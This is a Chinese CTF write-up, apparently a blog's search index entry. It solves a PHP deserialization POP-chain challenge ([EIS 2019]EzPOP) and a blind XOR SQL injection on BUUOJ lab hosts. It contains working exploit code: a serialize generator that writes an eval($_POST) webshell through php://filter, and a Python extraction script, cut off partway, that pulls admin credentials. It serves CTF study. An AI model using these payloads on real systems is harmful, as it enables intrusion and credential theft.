<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>BUUOJ-WEB</title>
      <link href="2021/05/09/BUUOJ-WEB/"/>
      <url>2021/05/09/BUUOJ-WEB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>buu后面的web题相对可能比较偏，为了减少我博客文件的个数，只好写入一个文件了，要不那么多文件文件夹看起来也挺乱的，我会在这篇博客中整理各个web题目成一个个分类，方便以后时时温习。</p><h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="一般php代码审计"><a href="#一般php代码审计" class="headerlink" title="一般php代码审计"></a>一般php代码审计</h2><h2 id="php反序列化pop链"><a href="#php反序列化pop链" class="headerlink" title="php反序列化pop链"></a>php反序列化pop链</h2><h3 id="base编码绕过提前exit-EIS-2019-EzPOP"><a href="#base编码绕过提前exit-EIS-2019-EzPOP" class="headerlink" title="base编码绕过提前exit();-[EIS 2019]EzPOP"></a>base编码绕过提前exit();-[EIS 2019]EzPOP</h3><h4 id="源码如下"><a href="#源码如下" class="headerlink" title="源码如下"></a>源码如下</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$store</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$store</span><span class="token punctuation">,</span> <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'flysystem'</span><span class="token punctuation">,</span> <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token variable">$key</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token variable">$store</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">expire</span> <span class="token operator">=</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">cleanContents</span><span class="token punctuation">(</span><span class="token keyword">array</span> <span class="token variable">$contents</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$cachedProperties</span> <span class="token operator">=</span> <span class="token function">array_flip</span><span class="token punctuation">(</span><span class="token punctuation">[</span>            <span class="token single-quoted-string string">'path'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'dirname'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'basename'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'extension'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'filename'</span><span class="token punctuation">,</span>            <span class="token single-quoted-string string">'size'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'mimetype'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'visibility'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'timestamp'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'type'</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$contents</span> <span class="token keyword">as</span> <span class="token variable">$path</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$object</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$contents</span><span class="token punctuation">[</span><span class="token variable">$path</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">array_intersect_key</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">,</span> <span class="token variable">$cachedProperties</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$contents</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getForStorage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$cleaned</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">cleanContents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cache</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$cleaned</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">complete</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getForStorage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">store</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">key</span><span class="token punctuation">,</span> <span class="token variable">$contents</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">autosave</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">getExpireTime</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">:</span> int <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getCacheKey</span><span class="token punctuation">(</span>string <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'prefix'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$serialize</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'serialize'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$serialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> bool<span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">writeTimes</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'expire'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getExpireTime</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getCacheKey</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">,</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>\<span class="token package">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 创建失败</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'data_compress'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'gzcompress'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//数据压缩</span>            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">gzcompress</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"&lt;?php\n//"</span> <span class="token punctuation">.</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'%012d'</span><span class="token punctuation">,</span> <span class="token variable">$expire</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"\n exit();?>\n"</span> <span class="token punctuation">.</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'src'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"uploads/"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>首先是<code>A、B</code>两个类，先看看危险的函数，注意到<code>file_put_contents($filename, $data)</code>函数可以利用，下面的代码分析一下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">$data = "<span class="token php language-php"><span class="token delimiter important">&lt;?</span>php\<span class="token package">n</span><span class="token comment">//" . sprintf('%012d', $expire) . "\n exit();</span><span class="token delimiter important">?></span></span>\n" . $data;$result = file_put_contents($filename, $data);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>就是将<code>$data</code>前面拼接一个<code>&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;</code>，这个就会直接读取到<code>exit();</code>就退出这个脚本了，下面我们传的<code>$data</code>就不能干好事了，所以这里要bypass这个，就利用到了这题中的考察点，<code>base64读写自动绕过不能解码得字符</code>。</p><p>然后正向看一下，首先看<code>A</code>类，A类中有个<code>$this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);</code>，出现了<code>set()</code>，这是调用了B类中的方法，那我们就能把<code>$this-&gt;store</code>赋值为一个B类的实例化后的对象。</p><p>注意看到了<code>set()</code>方法里面的几个参数，上下联系看，<code>$content</code>即下面的<code>$value</code>即下面的<code>$data</code>，就是我们要上传的<img src="/2021/05/09/BUUOJ-WEB/15579CC0.png" alt="img">。然后就是怎么bypass了。</p><p><code>options</code>数组里面的内容是我们可控的，可以将<code>$data = $this-&gt;serialize($value);</code>这里面的<code>$this-&gt;serialize</code>覆盖为<code>strval</code>已将$value转为字符串。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getForStorage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$cleaned</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">cleanContents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cache</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$cleaned</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">complete</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>json转换这里的complete参数需要设置为大于等于2的整数，代表的是$cleaned参数的数组深度。</p><p><code>$b-&gt;options[&#39;prefix&#39;] = &quot;php://filter/write=convert.base64-decode/resource=&quot;;</code>将$filename拼接为php伪协议的形式，只不过与之前用的read不同的是，这里要用write。</p><p><code>$b-&gt;options[&#39;expire&#39;] = 1;</code>这个倒是无关紧要，只要有个数就行应该，因为sprintf函数。</p><p><code>$b-&gt;options[&#39;data_compress&#39;] = false;</code>绕过数据压缩。</p><p>然而因为php的base64的原因，这里的payload里面的base64不能出现<code>=</code>符号，否则就会报错。</p><p><img src="/2021/05/09/BUUOJ-WEB/image-20210510012627310.png" alt="image-20210510012627310"></p><pre class="line-numbers language-encode" data-language="encode"><code class="language-encode">&lt;?php eval($_POST[&#39;zyq&#39;]);?&gt;PD9waHAgZXZhbCgkX1BPU1RbJ3p5cSddKTs&#x2F;Pg&#x3D;&#x3D;payload里面是不能有等号的因为，所以我们吧后面的&#x3D;&#x3D;去掉就行了，反正对b64来说只是填充位，意义不大PD9waHAgZXZhbCgkX1BPU1RbJ3p5cSddKTs&#x2F;Pg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>自己靠改变a的个数看看哪个payload行吧，行的payload会产生例如下面的文件</p><p><img src="/2021/05/09/BUUOJ-WEB/image-20210510020046829.png" alt="看看我的"></p><p>payload如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$store</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token comment">//因为上面的是被保护的变量，只能在类内被访问到了</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'eval.php'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$options</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'path'</span><span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'PD9waHAgZXZhbCgkX1BPU1RbJ3p5cSddKTs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//这里的base64需要删减最后等号（如果有等号的话，不然php会报错）</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cache</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'aaa'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//这里控制base64那里的长度</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">complete</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'2'</span><span class="token punctuation">;</span>  <span class="token comment">//这个参数大于2就行，代表数组的深度，但是要注意控制长度</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">start</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'prefix'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"php://filter/write=convert.base64-decode/resource="</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'expire'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'data_compress'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'serialize'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'strval'</span><span class="token punctuation">;</span><span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/05/09/BUUOJ-WEB/image-20210510020140696.png" alt="image-20210510020140696"></p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="一般字符型异或盲注-Black-Watch-入群题-Web"><a href="#一般字符型异或盲注-Black-Watch-入群题-Web" class="headerlink" title="一般字符型异或盲注-[Black Watch 入群题]Web"></a>一般字符型异或盲注-[Black Watch 入群题]Web</h2><p><strong>入群题既然已经作废了，写个wp应该么的事吧嘤嘤嘤</strong></p><p>首先是个简单的界面，点进登陆那里，没有发现注入点，可能是我太菜了，然后因为题目已经作废了，网上就有流传的wp了，看了一眼，原来是查询信息那里有个中转的api，注入点在那里，先打开burp抓一下包，看看带师傅的热点。</p><p><img src="/2021/05/09/BUUOJ-WEB/image-20210510234306788.png" alt="image-20210510234306788"></p><p><img src="/2021/05/09/BUUOJ-WEB/image-20210510234450308.png" alt="image-20210510234450308"></p><p>本来还以为要绕过啥的，没想到直接整型、异或就能注。。。</p><p><img src="/2021/05/09/BUUOJ-WEB/image-20210510234906684.png" alt="异或注入判断"></p><p>接下来就要上脚本了，拿出之前比赛徐神给的二分法脚本，改装版，）白嫖（</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># -----------------------------------------------------</span><span class="token comment"># @Author  : M4XLMUM                                  </span><span class="token comment"># @website : http://a16n.github.io</span><span class="token comment"># -----------------------------------------------------</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">'http://1b589db3-4568-4783-9f14-c05e52c65662.node3.buuoj.cn/backend/content_detail.php?id=1^(ascii(substr(&#123;0&#125;,&#123;1&#125;,1))>&#123;2&#125;)^1'</span><span class="token comment"># 上面url中0代表payload、1代表返回结果的第几位字符，二代表测试字符</span>payload1 <span class="token operator">=</span> <span class="token string">'database()'</span>  <span class="token comment"># news</span>payload2 <span class="token operator">=</span> <span class="token string">'(select(group_concat(table_name))from(information_schema.tables)where(table_schema=\'news\'))'</span>  <span class="token comment"># admin,contents</span>payload3 <span class="token operator">=</span> <span class="token string">'(select(group_concat(column_name))from(information_schema.columns)where(table_name=\'admin\'))'</span>  <span class="token comment"># id,username,password,is_enable</span>payload4 <span class="token operator">=</span> <span class="token string">'(select(group_concat(username))from(admin))'</span>  <span class="token comment"># f8654d35,4a6f634f</span>payload <span class="token operator">=</span> <span class="token string">'(select(group_concat(password))from(admin))'</span>  <span class="token comment"># 88f00b06,fe59e6ea</span>res <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    high <span class="token operator">=</span> <span class="token number">128</span>    low <span class="token operator">=</span> <span class="token number">32</span>    mid <span class="token operator">=</span> <span class="token punctuation">(</span>high <span class="token operator">+</span> low<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span>        <span class="token comment"># print(temp)</span>        text <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">print</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span>        <span class="token comment"># 打宕机时sleep一下</span>        <span class="token keyword">if</span> <span class="token string">'429'</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>            <span class="token keyword">continue</span>        <span class="token comment"># 判断为对时进入下面的if</span>        <span class="token keyword">if</span> <span class="token string">'title'</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>            low <span class="token operator">=</span> mid        <span class="token comment"># 判断为错时进入下面的else语句</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            high <span class="token operator">=</span> mid        <span class="token 